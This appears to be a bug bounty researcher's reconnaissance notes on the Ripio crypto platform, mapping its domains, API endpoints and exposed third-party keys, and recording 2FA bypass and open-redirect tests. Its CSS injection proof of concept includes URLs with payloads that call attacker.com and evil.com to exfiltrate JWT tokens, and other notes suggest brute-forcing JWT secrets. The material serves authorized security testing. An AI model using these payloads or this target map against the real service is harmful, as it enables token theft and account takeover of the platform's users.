# Ripio Bug Bounty Recon Notes

## Discovered Domains & Services

### Main Targets (Bounty Eligible)

| Domain                | Status  | Notes                                           |
| --------------------- | ------- | ----------------------------------------------- |
| app.ripio.com         | ✅ Live | Main platform, React SPA, MercadoPago/PaymentOS |
| trade.ripio.com       | ✅ Live | RipioTrade platform, Portuguese                 |
| auth.ripio.com        | ✅ Live | Auth service ($5k max)                          |
| kyc.ripio.com         | ✅ Live | KYC flow                                        |
| sandbox-b2b.ripio.com | ❌ 404  | Not accessible                                  |
| defi.ripio.com        | ❌ 404  | Not accessible                                  |

### Discovered Internal Services

| Domain                        | Purpose                                 |
| ----------------------------- | --------------------------------------- |
| api.ripio.com                 | **API Gateway** - proxy to all services |
| api.ripiotrade.co             | Ripio Trade API (v4)                    |
| apidocs.ripio.com             | API Documentation (Mintlify)            |
| apidocs.ripiotrade.co         | RipioTrade API Docs                     |
| docs.ripio.com                | B2B API Documentation                   |
| pluto.ripio.com               | DeFi module (Cloudflare protected)      |
| trade-dashboard.ripio.com     | Trading dashboard                       |
| status.ripio.com              | Status page (Atlassian Statuspage)      |
| d2pneqdaei3b3x.cloudfront.net | B2B Widget hosting                      |

### API Gateway Pattern

```
https://api.ripio.com/:service/:path
Example: https://api.ripio.com/trade/public/tickers
```

### JavaScript Libraries (Internal)

- `@ripio/ripio-auth` v3.4.2-3.4.6 - Authentication
- `@ripio/archimedes` v0.8.14 - Utilities
- `@ripio/eos-ds` v6.3.3-6.8.1 - Design system
- `@ripio/ws-client` v0.1.3 - WebSocket client
- `@ripio/mosaic-icons` - Icons

### External Services

- Cloudflare (WAF/CDN)
- Google Tag Manager (GTM-MNSPB4K)
- Facebook Pixel (290954058049451)
- MercadoPago SDK
- PaymentOS (payments)
- Boteria webchat

## ATO Challenge

- **Target**: ripiotestuser1@gmail.com / Sup3rs3cr3t!
- **Reward**: $6,000
- **Goal**: Demonstrate session hijack and critical action
- **Note**: Gmail account is OUT OF SCOPE

## Potential Attack Vectors

1. [ ] Authentication bypass on auth.ripio.com
2. [ ] IDOR on user accounts/transactions
3. [ ] Business logic in trading/DeFi
4. [ ] KYC bypass
5. [ ] API endpoint enumeration
6. [ ] WebSocket vulnerabilities
7. [ ] Payment flow manipulation

## API Endpoints to Enumerate

- [ ] /api/v1/users
- [ ] /api/v1/auth
- [ ] /api/v1/transactions
- [ ] /api/v1/kyc
- [ ] /api/v1/wallet
- [ ] GraphQL endpoints

## API Documentation Found

### Ripio Trade API (api.ripiotrade.co)

- **Base URL**: `https://api.ripiotrade.co/v4/`
- **Auth**: API Token + Secret Key (HMAC SHA256 + Base64)
- **Signature**: `Timestamp + HTTP Method + Path + JSON Payload`
- **Timestamp tolerance**: up to 60 seconds (default 5s)
- **Create API keys at**: https://trade.ripio.com/market/api/token

### B2B Sandbox API (sandbox-b2b.ripio.com)

- **Auth endpoint**: `POST https://sandbox-b2b.ripio.com/w/api/v1/auth`
- **Format**: `username=<client_id>:<external_ref>` + `password=<client_secret>`
- **Returns**: JWT token

### Key Endpoints to Test

- `/v4/balances` - User balances (IDOR?)
- `/v4/orders` - User orders (IDOR?)
- `/v4/user/trades` - User trades (IDOR?)
- `/v4/withdrawals` - Crypto withdrawals (Business logic?)
- `/v4/wallets` - User wallets (IDOR?)
- `/v4/statement` - Account statement (IDOR?)

## Potential Vulnerability Areas

### 1. Signature Bypass

- [ ] Test timestamp tolerance manipulation (up to 60s window)
- [ ] Test signature without path params for GET requests
- [ ] Test empty body vs null body in signature

### 2. IDOR Candidates

- [ ] `/v4/orders/{order_id}` - Access other users' orders
- [ ] `/v4/withdrawals/{id}` - Access other users' withdrawals
- [ ] `/v4/deposits/{id}` - Access other users' deposits
- [ ] `/v4/wallets/{currency}` - Access other users' wallets
- [ ] `/v4/statement` - Access other users' statements

### 3. Business Logic

- [ ] Withdrawal limits bypass
- [ ] Order manipulation (price, amount)
- [ ] Fee calculation bypass
- [ ] Double-spending via race conditions

### 4. Authentication

- [ ] JWT token manipulation (B2B API)
- [ ] external_ref enumeration/prediction
- [ ] Token reuse across users

### 5. ATO Challenge ($6,000) - TESTED!

**Target**: ripiotestuser1@gmail.com / Sup3rs3cr3t!

#### ✅ VERIFIED - Credentials are CORRECT!

Login returns 2FA prompt, not "invalid credentials"

#### 2FA Protection Active

```json
{
  "detail": "El código es incorrecto",
  "devices": [
    {
      "name": "default",
      "persistent_id": "b3RwX3RvdHAudG90cGRldmljZS80NzkwNjk",
      "method": "generator",
      "security_level": 3
    }
  ]
}
```

**Decoded persistent_id**: `otp_totp.totpdevice/479069` (internal device ID)

#### Tested 2FA Bypass Vectors (FAILED):

- [x] otp=null → Still requires code
- [x] otp="" → Still requires code
- [x] otp=["000000"] → Validation error
- [x] device parameter → Ignored
- [x] /otp/disable/ endpoint → 404
- [x] /backup-codes/ endpoint → 404

#### Remaining Attack Vectors for ATO:

- [ ] Password reset token analysis
- [ ] TOTP timing attacks (race condition)
- [ ] OAuth token theft via redirect
- [ ] Session fixation
- [ ] Response manipulation (remove 2FA requirement)

## TRAFFIC ANALYSIS FINDINGS (NEW!)

### Auth API Endpoints Discovered

```
POST https://auth.ripio.com/api/v2/authentication/register/
POST https://auth.ripio.com/api/v2/authentication/login/?redirect_url=https://app.ripio.com
POST https://auth.ripio.com/api/users/reset-password/
GET  https://auth.ripio.com/api/users/country?language=ru-RU
GET  https://app.ripio.com/api/v3/i18n/web?language=ru-RU
```

### ⚠️ OPEN REDIRECT - TESTED

**Endpoint**: `https://auth.ripio.com/api/v2/authentication/login/`
**Parameter**: `redirect_url=`

**Test Results**:
| Vector | Result |
|--------|--------|
| `https://evil.com` | ❌ "Invalid redirect url" |
| `https://app.ripio.com.evil.com` | ❌ "Invalid redirect url" |
| `https://app.ripio.com@evil.com` | ❌ "Invalid redirect url" |
| `//evil.com` | ❌ "Invalid redirect url" |
| `https://trade.ripio.com` | ✅ Accepted (whitelisted) |
| `https://kyc.ripio.com/test` | ✅ Accepted (\*.ripio.com whitelisted) |
| `javascript:alert(1)` | 🛡️ Cloudflare WAF blocked |

**Conclusion**: Domain whitelist is enforced - only \*.ripio.com allowed

### ⚠️ PASSWORD RESET - NO RATE LIMITING!

**Endpoint**: `POST https://auth.ripio.com/api/users/reset-password/`
**Tested**: 5 consecutive requests - ALL ACCEPTED

**Impact**:

- Email bombing/spam possible
- Potential for token brute-force if reset tokens are weak
- DoS via email flooding

**Severity**: Low-Medium (depending on program rules)

### Google OAuth Configuration

- **Client ID**: `511594232903-j2udbch1fk5itukqdjs0ssvsshqt9j3q.apps.googleusercontent.com`
- Uses FedCM (Federated Credential Management)
- **Test for**: OAuth state parameter bypass, token leakage

### External Services Discovered

| Service        | URL                    | Purpose            |
| -------------- | ---------------------- | ------------------ |
| Segment        | api.segment.io         | Analytics          |
| Adjust         | app.adjust.com         | Mobile attribution |
| Deep Links     | ripio.go.link          | App deep linking   |
| IP Geolocation | ipapi.co/json/         | Country detection  |
| Schema Flow    | cdn.schema-flow.com    | Config data        |
| ReclameAqui    | api.reclameaqui.com.br | Reviews            |

### Analytics IDs

- **Google Analytics**: `G-MLNX2RBE42`, `UA-38627185-3`
- **GTM**: `GTM-KBM64822`
- **Facebook Pixel**: `290954058049451`

### Config Files to Check

```
https://cdn.segment.com/v1/projects/0BoyMZpAEi0k1Oepp7nYCBTz65dfh85S/settings ✅ EXPOSED
https://cdn.schema-flow.com/5f17344acf2c6d3c3a1d6238/5f17344acf2c6dc4eb1d6239/es.json
https://cdn.schema-flow.com/5f17344acf2c6d3c3a1d6238/global.json
```

### ⚠️ SEGMENT API KEY EXPOSURE (Info Disclosure)

**URL**: `https://cdn.segment.com/v1/projects/0BoyMZpAEi0k1Oepp7nYCBTz65dfh85S/settings`
**API Key**: `0BoyMZpAEi0k1Oepp7nYCBTz65dfh85S`
**Integrations**: Amplitude, Google Analytics

**Impact**:

- Can track user events and analytics
- Potentially inject fake events
- Information disclosure about internal tracking

### Deep Link Service (ripio.go.link)

- **Adjust tracking IDs**: `1gkq6pge_1glu1uyn_1gtujrrj`
- **Fallback redirects**: Redirects to `auth.ripio.com/#/register`
- **Potential for open redirect abuse via adj_fallback parameter**

---

## 🔴 HIGH PRIORITY FINDINGS

### CSS INJECTION в B2B Widget (HIGH SEVERITY!)

**URL**: `https://d2pneqdaei3b3x.cloudfront.net/index.html`
**Vulnerable Parameters**: `_fn`, `_fo`, `_fd`

**Vulnerable Code**:

```javascript
const customFontsText = `@import url('https://fonts.googleapis.com/css2?family=${fontOpts}'); 
body { font-family: '${fontName}', ${fontDefault};}`;
// User input directly interpolated into CSS via template literals!
```

**PoC - CSS Data Exfiltration**:

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=test';}*{background:url('https://attacker.com/steal?token=')}/*&_fo=x
```

**Impact**:

- CSS injection can exfiltrate sensitive data via CSS selectors
- Can style-jack the widget (phishing within legitimate domain)
- Potentially steal JWT token from URL via CSS attribute selectors
- If combined with JWT in URL: `?_to=JWT&_fn=PAYLOAD` → token exfiltration

**Severity**: HIGH for financial B2B widget

---

### JWT Token in URL + CSS Injection = Token Theft

**Attack Scenario**:

1. Victim receives link: `https://d2pneqdaei3b3x.cloudfront.net/index.html?_to=VALID_JWT&_fn=x';}input[value^="eyJ"]{background:url('https://evil.com/steal?t=')}/*`
2. CSS injection triggers request to attacker's server
3. Combined with Referer leakage, full token can be extracted

---

### Security Endpoint Discovered

**Endpoint**: `PUT https://auth.ripio.com/api/users/security/`
**Auth**: Bearer JWT token
**Purpose**: Modify user security settings (potentially disable 2FA/security?)

---

## CRITICAL FINDINGS

### 1. User ID Disclosure via WebSocket (Medium-High)

**Endpoint**: `wss://ws-api.ripio.com` or WebSocket Stream
**Topic**: `orderbook/level_2_with_users@BASE_QUOTE`

**Issue**: The orderbook WebSocket topic exposes user UUIDs in the response:

```json
{
  "asks": [
    {
      "amount": 184.9,
      "price": 20,
      "users": ["5EF6B2C9-28C9-4C50-99EA-7F3A38958F0A"]
    }
  ]
}
```

**Impact**:

- User enumeration
- Track individual user trading activity
- Correlate orders with specific users
- Potential for targeted attacks

**Reproduction**:

1. Connect to WebSocket `wss://ws.ripiotrade.co` (or similar)
2. Subscribe to topic: `{"method": "subscribe", "topics": ["orderbook/level_2_with_users@ETH_BRL"]}`
3. Observe user UUIDs in response

---

### 2. JWT Token in URL Parameters (Medium)

**Endpoint**: `https://d2pneqdaei3b3x.cloudfront.net/index.html`
**Parameter**: `_to=<JWT_TOKEN>`

**Issue**: B2B Widget passes JWT authentication token via URL parameter:

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_to=JWT_TOKEN_HERE
```

**Impact**:

- Token leakage via HTTP Referer headers
- Token exposure in server access logs
- Token cached in browser history
- Token visible in proxy logs
- Potential session hijacking

**Exploitation**:

1. If victim clicks external link from widget page, Referer header leaks JWT
2. Server logs may store JWT tokens
3. Browser history preserves tokens

---

### 3. JWT Algorithm HS256 - Potential Weak Secret (Low-Medium)

**API**: B2B Widget webhooks
**Algorithm**: HS256 (symmetric)

**Issue**: JWT tokens use HS256 which is vulnerable to:

- Secret key brute-forcing (hashcat/john)
- Algorithm confusion attacks (alg:none, RS256->HS256)

**Sample JWT from docs**:

```json
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

---

### 4. API Rate Limit Info Disclosure

**Endpoint**: `https://api.ripio.com/api/v1/users/me`
**Status**: 429 Too Many Requests

**Issue**: Endpoint exists and responds with rate limit, confirming API structure.

---

## Endpoints for Further Testing

### Ripio Trade API (api.ripiotrade.co)

- `GET /v4/public/tickers` Works (no auth)
- `GET /v4/public/pairs` Works (no auth)
- `GET /v4/balances` - Requires auth (IDOR candidate)
- `GET /v4/orders` - Requires auth (IDOR candidate)
- `GET /v4/withdrawals` - Requires auth (IDOR candidate)

### Main Platform API (api.ripio.com)

- Root returns `{"data":"pong"}`
- `/api/v1/users/me` - Exists (rate limited)

### B2B Sandbox

- `POST https://sandbox-b2b.ripio.com/w/api/v1/auth`
- Widget: `https://d2pneqdaei3b3x.cloudfront.net/`

### WebSocket

- Stream: `wss://ws.ripiotrade.co` (assumed)
- API: `wss://ws-api.ripio.com`

---

## Recommended Next Steps for Manual Testing

1. **WebSocket User ID Disclosure**

   - Connect to WebSocket and subscribe to `orderbook/level_2_with_users@*`
   - Document exposed user IDs and trading patterns

2. **JWT Token Analysis**

   - Register for B2B sandbox access
   - Analyze JWT token structure
   - Test for weak secrets with jwt_tool/hashcat
   - Test algorithm confusion attacks

3. **IDOR Testing** (requires account)

   - Create 2 test accounts
   - Test order ID access across accounts
   - Test withdrawal/deposit ID access
   - Test statement access

4. **Auth Flow Analysis**

   - Analyze auth.ripio.com login flow
   - Test password reset for token manipulation
   - Check for OAuth misconfigurations

5. **ATO Challenge**
   - Focus on password reset flow
   - Look for token prediction/manipulation
   - Check for session fixation

## VERIFIED JWT TOKEN ANALYSIS

**Token Source**: User-provided access token (auth.ripio.com)
**Algorithm**: RS256 (asymmetric - secure)

**Decoded Payload**:

```json
{
  "user_user_uuid": "691e2136-48bb-4e55-9318-a594ac9c3cec",
  "has_2fa": false,
  "is_staff": false,
  "back": "RIPIO",
  "exp": 1764611044 // 10 min lifetime
}
```

**Validated Endpoints**:

- `GET https://auth.ripio.com/api/users/me/` ✅ Returns user data
- `PUT https://auth.ripio.com/api/users/security/` ✅ Accepts JWT (requires valid token)

---

## FINAL REPORT SUMMARY

### REPORTABLE FINDINGS (HIGH/MEDIUM)

| #   | Vulnerability                   | Severity | File                 |
| --- | ------------------------------- | -------- | -------------------- |
| 1   | **CSS Injection in B2B Widget** | HIGH     | CSS_INJECTION_POC.md |
| 2   | **JWT Token in URL Parameter**  | MEDIUM   | (design flaw)        |
| 3   | **Combined Attack: CSS + JWT**  | HIGH     | CSS_INJECTION_POC.md |

### EXCLUDED (Out of Scope per Ripio Policy)

- Rate limiting on password reset
- User enumeration
- Information disclosure without impact
- Open redirect (whitelisted)

### ATO CHALLENGE STATUS

- Credentials verified: ripiotestuser1@gmail.com / Sup3rs3cr3t!
- 2FA (TOTP) enabled - bypass not found
- Remaining vectors: OAuth flow manipulation, session analysis

---

## NEW API ENDPOINTS (Traffic Analysis)

### KYC API (kyc-api.ripio.com) - IDOR CANDIDATE!

```
GET https://kyc-api.ripio.com/api/v2/validations/{ID}/
GET https://kyc-api.ripio.com/api/v2/validations/{ID}/documents/
GET https://kyc-api.ripio.com/api/v2/validations/constants/marital-status?country=AR
GET https://kyc-api.ripio.com/api/v2/validations/constants/personal-activities/?country=AR
GET https://kyc-api.ripio.com/api/v2/validations/constants/states?country=AR
```

**Validation ID discovered**: `3418360` (sequential, predictable!)

### Nexus API (nexus.ripio.com)

```
GET https://nexus.ripio.com/api/v1/balances/?ref_currency=ARS
GET https://nexus.ripio.com/api/v1/navigation/wallet_web_new/
GET https://nexus.ripio.com/api/v1/cx/tickets/reasons-options/?product=RIPIO_WALLET
GET https://nexus.ripio.com/api/view/v1/web/defi/simple/detail/?currency=BTC
GET https://nexus.ripio.com/api/view/v1/web/defi/simple/home/
```

### Nexus Socket (nexus-socket.ripio.com)

```
WSS https://nexus-socket.ripio.com/socket.io/?EIO=4&transport=websocket
POST https://nexus-socket.ripio.com/api/core/auth/
```

### App API v3/v4 (app.ripio.com)

```
GET /api/v3/accounts/me/
GET /api/v3/balance/
GET /api/v3/transactions/?limit=5
GET /api/v3/transactions/limits/
GET /api/v3/transactions/gateways/
GET /api/v3/rewards/summary/
GET /api/v3/currencies/
GET /api/v3/currency-pairs/
GET /api/v3/rates/
GET /api/v3/alerts/alerts/
GET /api/v3/tycs/summary/
GET /api/v3/balance/ripio-trade/
POST /api/v3/accounts/startvalidation/
GET /api/v4/accounts/predata-kyc/
```

### Chatbot Backend (rpchatbot-backend.ripio.com)

```
GET /api/v2/healthcheck/ping
```

### Third-Party Services

- **Hotjar**: site_id=3635831
- **Sentry**: o8837.ingest.us.sentry.io (key: b919b1f947576aa56e446571dc30feb6)
- **Sprig**: C0ffx_YJ6s
- **MercadoPago**: Payment integration
